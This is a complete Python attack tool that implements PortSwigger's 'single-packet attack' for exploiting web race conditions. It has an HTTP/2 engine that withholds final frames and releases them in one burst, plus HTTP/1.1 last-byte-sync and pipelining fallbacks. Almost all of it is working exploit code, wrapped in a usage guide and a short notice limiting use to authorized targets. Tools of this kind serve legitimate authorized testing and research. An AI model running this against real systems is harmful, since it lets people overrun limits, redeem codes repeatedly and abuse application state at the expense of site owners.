#!/usr/bin/env python3
"""
single_packet_attack.py
========================

Sends two or more raw HTTP requests so that they land on the server in a
single TCP packet, implementing James Kettle / PortSwigger's "single-packet
attack" technique for finding web race conditions:

    Research paper : https://portswigger.net/research/smashing-the-state-machine
    Reference impl : https://github.com/PortSwigger/turbo-intruder/blob/master/
                      resources/examples/race-single-packet-attack.py

The algorithm (HTTP/2 engine, mirrors the paper's "Rolling your own
implementation" section):

  1. Open ONE TLS connection, negotiate HTTP/2 via ALPN.
  2. For every queued request, send its HEADERS frame and all of its body
     except the final byte (or, for bodyless requests, withhold an empty
     DATA frame carrying END_STREAM). Nothing is marked complete yet, so the
     server can't start processing any of them.
  3. Wait ~100ms so those partial frames are definitely out on the wire.
  4. Send a PING frame to "warm" the local connection -- without this the
     OS puts the first release frame in its own packet.
  5. Immediately release every withheld final frame back-to-back in one
     burst. Because TCP_NODELAY is left disabled, Nagle's algorithm batches
     them into a single outbound TCP segment, so they all "complete" for
     the server at effectively the same instant regardless of network
     jitter.

Because step 5 needs multiplexed streams on one connection, true
single-packet delivery of independent requests requires HTTP/2. Two
HTTP/1.1 fallbacks are included for targets that don't speak HTTP/2:

  * last-byte-sync : one TCP connection per request, each held open with
    its final byte withheld, then every final byte is fired in one tight
    loop. This is the classic Turbo Intruder "last-byte sync" engine the
    paper benchmarks against (4ms median spread vs 1ms for single-packet).

  * http1-pipeline  : concatenates every raw request into ONE socket.send()
    call on a single keep-alive connection. If the combined payload fits in
    one TCP segment this is a literal single packet, but because HTTP/1.1
    is processed sequentially per-connection it only exposes race windows
    on servers that hand each pipelined request off to a worker as soon as
    it's parsed, rather than only after the previous response is sent.

LEGAL / ETHICAL USE
--------------------
This script lets you win race conditions, which is a real attack technique
(limit-overrun, TOCTOU, sub-state abuse, etc). Only point it at systems you
own or are explicitly authorized to test (e.g. a bug bounty program's
in-scope assets, your own lab, PortSwigger's Web Security Academy labs).

INSTALL
-------
    pip install h2        # only required for the http2 engine

USAGE
-----
Single endpoint / limit-overrun probing (same request N times):

    python3 single_packet_attack.py \
        --host target.example.com --port 443 \
        --request redeem.txt --count 20 --engine http2

Multi-endpoint collision (different requests, each sent once):

    python3 single_packet_attack.py \
        --host target.example.com \
        --requests change_email.txt confirm_email.txt \
        --engine http2

Raw request files are exactly what you'd paste into Burp Repeater's "raw"
tab -- request line, headers, blank line, optional body. Example:

    POST /api/cart/discount HTTP/1.1
    Host: target.example.com
    Cookie: session=abc123
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 12

    code=TOP10
"""

import argparse
import socket
import ssl
import sys
import threading
import time

try:
    import h2.config
    import h2.connection
    import h2.events
    HAVE_H2 = True
except ImportError:
    HAVE_H2 = False


# --------------------------------------------------------------------------
# Raw HTTP/1.1 request parsing / rebuilding
# --------------------------------------------------------------------------

HOP_BY_HOP_HEADERS = {
    "host", "connection", "keep-alive", "proxy-connection",
    "transfer-encoding", "upgrade", "http2-settings",
}


def parse_raw_request(raw: bytes):
    """Split a raw HTTP/1.x request into (method, path, version, headers, body)."""
    sep = b"\r\n\r\n" if b"\r\n\r\n" in raw else b"\n\n"
    if sep in raw:
        head, body = raw.split(sep, 1)
    else:
        head, body = raw, b""

    head_text = head.decode("latin-1")
    lines = head_text.split("\r\n") if "\r\n" in head_text else head_text.split("\n")
    lines = [l for l in lines if l != ""]
    if not lines:
        raise ValueError("empty request")

    parts = lines[0].split(" ", 2)
    if len(parts) != 3:
        raise ValueError(f"malformed request line: {lines[0]!r}")
    method, path, version = parts

    headers = []
    for line in lines[1:]:
        name, _, value = line.partition(":")
        headers.append((name.strip(), value.strip()))

    return method, path, version, headers, body


def get_header(headers, name):
    name = name.lower()
    for k, v in headers:
        if k.lower() == name:
            return v
    return None


def rebuild_http1_request(method, path, version, headers, body, default_host=None):
    """Re-serialize a parsed request with CRLF endings and a correct Content-Length."""
    headers = [(k, v) for k, v in headers if k.lower() != "content-length"]
    if get_header(headers, "host") is None:
        if not default_host:
            raise ValueError("request has no Host header and --host was not given")
        headers.insert(0, ("Host", default_host))
    if body:
        headers.append(("Content-Length", str(len(body))))

    lines = [f"{method} {path} {version}"]
    lines += [f"{k}: {v}" for k, v in headers]
    head = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1")
    return head + body


def to_h2_headers(method, path, authority, scheme, headers):
    """Convert HTTP/1.1-style headers into an HTTP/2 pseudo-header + header list."""
    h2_headers = [
        (":method", method),
        (":path", path),
        (":scheme", scheme),
        (":authority", authority),
    ]
    for name, value in headers:
        if name.lower() in HOP_BY_HOP_HEADERS:
            continue
        h2_headers.append((name.lower(), value))
    return h2_headers


def load_raw_requests(args):
    """Build the list of raw request byte-strings to fire, per the CLI args."""
    if args.request:
        with open(args.request, "rb") as f:
            raw = f.read()
        return [raw] * max(1, args.count)
    else:
        raws = []
        for path in args.requests:
            with open(path, "rb") as f:
                raws.append(f.read())
        return raws * max(1, args.count)


# --------------------------------------------------------------------------
# Engine 1: HTTP/2 single-packet attack
# --------------------------------------------------------------------------

class SinglePacketAttack:
    """Implements the paper's single-packet attack over one HTTP/2 connection."""

    def __init__(self, host, port, authority=None, tls=True, verify=True, timeout=10):
        self.host = host
        self.port = port
        self.authority = authority or host
        self.tls = tls
        self.verify = verify
        self.timeout = timeout
        self.sock = None
        self.conn = None
        self.pending_releases = []   # callables that emit each withheld final frame
        self.stream_order = []       # stream_id per queued request, in queue order
        self.responses = {}
        self.fire_time = None

    def connect(self):
        if not HAVE_H2:
            raise RuntimeError("The 'h2' package is required for --engine http2 "
                                "(pip install h2). Use --engine last-byte-sync or "
                                "http1-pipeline instead.")
        raw_sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        # Deliberately leave TCP_NODELAY at its default (disabled) so Nagle's
        # algorithm batches the withheld frames we release in fire().
        if self.tls:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            if not self.verify:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            self.sock = ctx.wrap_socket(raw_sock, server_hostname=self.authority)
            negotiated = self.sock.selected_alpn_protocol()
            if negotiated != "h2":
                raise RuntimeError(
                    f"server did not negotiate HTTP/2 over ALPN (got {negotiated!r}); "
                    "it probably only speaks HTTP/1.1 -- retry with "
                    "--engine last-byte-sync or --engine http1-pipeline"
                )
        else:
            # plaintext h2c, "prior knowledge" mode -- only works against
            # servers/labs explicitly configured to accept it.
            self.sock = raw_sock

        config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
        self.conn = h2.connection.H2Connection(config=config)
        self.conn.initiate_connection()
        self.sock.sendall(self.conn.data_to_send())

    def queue_request(self, method, path, headers, body: bytes):
        """Pre-send a request's HEADERS + body, withholding its final byte/frame."""
        stream_id = self.conn.get_next_available_stream_id()
        h2_headers = to_h2_headers(method, path, self.authority,
                                    "https" if self.tls else "http", headers)
        # Recompute content-length from the actual body rather than trusting
        # whatever value was in the raw request text (it may be stale/wrong).
        h2_headers = [(k, v) for k, v in h2_headers if k != "content-length"]
        if body:
            h2_headers.append(("content-length", str(len(body))))
        self.conn.send_headers(stream_id, h2_headers, end_stream=False)

        if body:
            if len(body) > 1:
                self.conn.send_data(stream_id, body[:-1], end_stream=False)
            final_byte = body[-1:]

            def release(sid=stream_id, chunk=final_byte):
                self.conn.send_data(sid, chunk, end_stream=True)
        else:
            def release(sid=stream_id):
                self.conn.send_data(sid, b"", end_stream=True)

        self.pending_releases.append(release)
        self.stream_order.append(stream_id)
        return stream_id

    def flush_pending_bulk(self):
        """Push everything queued so far (minus the withheld final frames) to the wire."""
        data = self.conn.data_to_send()
        if data:
            self.sock.sendall(data)

    def fire(self, gate_delay=0.1):
        """Warm the connection, then release every withheld final frame in one burst."""
        time.sleep(gate_delay)

        self.conn.ping(b"warmup\x00\x00"[:8])
        self.sock.sendall(self.conn.data_to_send())

        for release in self.pending_releases:
            release()
        self.fire_time = time.time()
        self.sock.sendall(self.conn.data_to_send())

    def read_responses(self, read_timeout=5):
        pending = set(self.stream_order)
        self.sock.settimeout(read_timeout)
        deadline = time.time() + read_timeout
        while pending and time.time() < deadline:
            try:
                data = self.sock.recv(65535)
            except socket.timeout:
                break
            if not data:
                break
            for event in self.conn.receive_data(data):
                if isinstance(event, h2.events.ResponseReceived):
                    r = self.responses.setdefault(event.stream_id, {
                        "headers": [], "body": b"", "time": None,
                    })
                    r["headers"] = event.headers
                    r["time"] = time.time()
                elif isinstance(event, h2.events.DataReceived):
                    r = self.responses.setdefault(event.stream_id, {
                        "headers": [], "body": b"", "time": time.time(),
                    })
                    r["body"] += event.data
                    self.conn.acknowledge_received_data(len(event.data), event.stream_id)
                elif isinstance(event, (h2.events.StreamEnded, h2.events.StreamReset)):
                    pending.discard(event.stream_id)
                elif isinstance(event, h2.events.ConnectionTerminated):
                    pending.clear()
            out = self.conn.data_to_send()
            if out:
                self.sock.sendall(out)
        return self.responses

    def close(self):
        try:
            self.conn.close_connection()
            self.sock.sendall(self.conn.data_to_send())
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass


def run_http2_engine(args, raw_requests):
    attack = SinglePacketAttack(
        host=args.host, port=args.port, authority=args.authority,
        tls=not args.no_tls, verify=not args.insecure, timeout=args.timeout,
    )
    attack.connect()

    parsed = [parse_raw_request(r) for r in raw_requests]
    for method, path, _version, headers, body in parsed:
        attack.queue_request(method, path, headers, body)
    attack.flush_pending_bulk()

    attack.fire(gate_delay=args.gate_delay / 1000.0)
    responses = attack.read_responses(read_timeout=args.read_timeout)

    results = []
    for i, stream_id in enumerate(attack.stream_order):
        r = responses.get(stream_id)
        status = None
        if r:
            status = get_header(r["headers"], ":status")
        rel_ms = None
        if r and r.get("time") and attack.fire_time:
            rel_ms = (r["time"] - attack.fire_time) * 1000.0
        results.append({
            "index": i,
            "status": status,
            "body_len": len(r["body"]) if r else None,
            "body_preview": (r["body"][:120].decode("utf-8", "replace") if r else ""),
            "rel_ms": rel_ms,
        })
    attack.close()
    return results


# --------------------------------------------------------------------------
# Engine 2: HTTP/1.1 last-byte sync (fallback for non-H2 targets)
# --------------------------------------------------------------------------

def run_last_byte_sync(args, raw_requests):
    sockets = []
    for raw in raw_requests:
        method, path, version, headers, body = parse_raw_request(raw)
        full = rebuild_http1_request(method, path, version, headers, body, args.authority)

        s = socket.create_connection((args.host, args.port), timeout=args.timeout)
        if not args.no_tls:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            if args.insecure:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=args.authority)

        s.sendall(full[:-1])   # withhold the final byte
        sockets.append((s, full[-1:]))

    time.sleep(args.gate_delay / 1000.0)

    fire_time = time.time()
    for s, last_byte in sockets:
        s.sendall(last_byte)   # release every connection back-to-back

    # Read every socket concurrently -- a serial read loop would make later
    # sockets' timestamps wrongly include earlier sockets' read time.
    results = [None] * len(sockets)

    def reader(i, s):
        s.settimeout(args.read_timeout)
        chunks = []
        first_byte_time = None
        try:
            while True:
                data = s.recv(65535)
                if not data:
                    break
                if first_byte_time is None:
                    first_byte_time = time.time()
                chunks.append(data)
        except socket.timeout:
            pass
        raw_resp = b"".join(chunks)
        status = None
        if raw_resp.startswith(b"HTTP/"):
            try:
                status = raw_resp.split(b"\r\n", 1)[0].split(b" ")[1].decode()
            except Exception:
                pass
        results[i] = {
            "index": i,
            "status": status,
            "body_len": len(raw_resp),
            "body_preview": raw_resp[-200:].decode("utf-8", "replace"),
            "rel_ms": ((first_byte_time - fire_time) * 1000.0
                    if first_byte_time else None),
        }
        s.close()

    threads = [threading.Thread(target=reader, args=(i, s)) for i, (s, _) in enumerate(sockets)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(args.read_timeout + 1)
    return results


# --------------------------------------------------------------------------
# Engine 3: raw HTTP/1.1 pipelining on one socket (best-effort single packet)
# --------------------------------------------------------------------------

def run_http1_pipeline(args, raw_requests):
    s = socket.create_connection((args.host, args.port), timeout=args.timeout)
    if not args.no_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        if args.insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.authority)

    payload = b""
    for raw in raw_requests:
        method, path, version, headers, body = parse_raw_request(raw)
        payload += rebuild_http1_request(method, path, version, headers, body, args.authority)

    fire_time = time.time()
    s.sendall(payload)   # one syscall -- OS/TLS record layer will try to emit this as

    s.settimeout(args.read_timeout)
    chunks = []
    try:
        while True:
            data = s.recv(65535)
            if not data:
                break
            chunks.append(data)
    except socket.timeout:
        pass
    s.close()

    raw_resp = b"".join(chunks)
    # naive split on "HTTP/1.1 " / "HTTP/1.0 " response boundaries
    parts = []
    marker = b"HTTP/1."
    idx = raw_resp.find(marker)
    while idx != -1:
        nxt = raw_resp.find(marker, idx + 1)
        parts.append(raw_resp[idx:nxt if nxt != -1 else None])
        idx = nxt

    results = []
    for i, chunk in enumerate(parts):
        status = None
        try:
            status = chunk.split(b"\r\n", 1)[0].split(b" ")[1].decode()
        except Exception:
            pass
        results.append({
            "index": i,
            "status": status,
            "body_len": len(chunk),
            "body_preview": chunk[-200:].decode("utf-8", "replace"),
            "rel_ms": (time.time() - fire_time) * 1000.0,
        })
    return results


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def build_arg_parser():
    p = argparse.ArgumentParser(
        description="Send multiple HTTP requests in a single TCP packet "
                    "(PortSwigger single-packet race condition attack).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--host", required=True, help="host/IP to connect to")
    p.add_argument("--port", type=int, default=None,
                    help="port to connect to (default: 443 with TLS, 80 without)")
    p.add_argument("--authority", default=None,
                    help=":authority / Host header value and TLS SNI, if different "
                        "from --host (default: same as --host)")
    p.add_argument("--no-tls", action="store_true", help="use plaintext instead of TLS")
    p.add_argument("--insecure", action="store_true",
                    help="don't verify the server's TLS certificate")

    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--request", help="path to a single raw request file, "
                                    "sent --count times (limit-overrun / single-endpoint)")
    g.add_argument("--requests", nargs="+",
                    help="paths to distinct raw request files, each sent once "
                        "(multi-endpoint collisions)")

    p.add_argument("--count", type=int, default=1,
                    help="repetitions: with --request, how many copies to send; "
                        "with --requests, how many times to repeat the whole group")
    p.add_argument("--engine", choices=["http2", "last-byte-sync", "http1-pipeline"],
                    default="http2", help="attack engine (default: http2)")
    p.add_argument("--gate-delay", type=float, default=100,
                    help="ms to wait after pre-sending before releasing the "
                        "withheld final frames/bytes (default: 100)")
    p.add_argument("--timeout", type=float, default=10, help="connect timeout, seconds")
    p.add_argument("--read-timeout", type=float, default=5,
                    help="how long to wait for responses, seconds")
    return p


def print_results(results):
    print(f"\n{'#':>3}  {'status':>6}  {'len':>7}  {'Δt (ms)':>9}   preview")
    print("-" * 78)
    for r in results:
        rel = f"{r['rel_ms']:.2f}" if r["rel_ms"] is not None else "?"
        preview = r["body_preview"].replace("\n", "\\n").replace("\r", "")
        flag = "  <-- response before request completed (static file / no race?)" \
            if r["rel_ms"] is not None and r["rel_ms"] < 0 else ""
        print(f"{r['index']:>3}  {str(r['status']):>6}  {str(r['body_len']):>7}  "
            f"{rel:>9}   {preview[:60]}{flag}")


def main():
    args = build_arg_parser().parse_args()
    if args.port is None:
        args.port = 80 if args.no_tls else 443
    if args.authority is None:
        args.authority = args.host

    raw_requests = load_raw_requests(args)
    if len(raw_requests) < 2:
        print("warning: only 1 request queued -- a race attack needs 2+", file=sys.stderr)

    print(f"[*] engine={args.engine}  target={args.host}:{args.port}  "
        f"requests={len(raw_requests)}  gate_delay={args.gate_delay}ms")

    try:
        if args.engine == "http2":
            results = run_http2_engine(args, raw_requests)
        elif args.engine == "last-byte-sync":
            results = run_last_byte_sync(args, raw_requests)
        else:
            results = run_http1_pipeline(args, raw_requests)
    except Exception as e:
        print(f"[!] attack failed: {e}", file=sys.stderr)
        sys.exit(1)

    print_results(results)


if __name__ == "__main__":
    main()
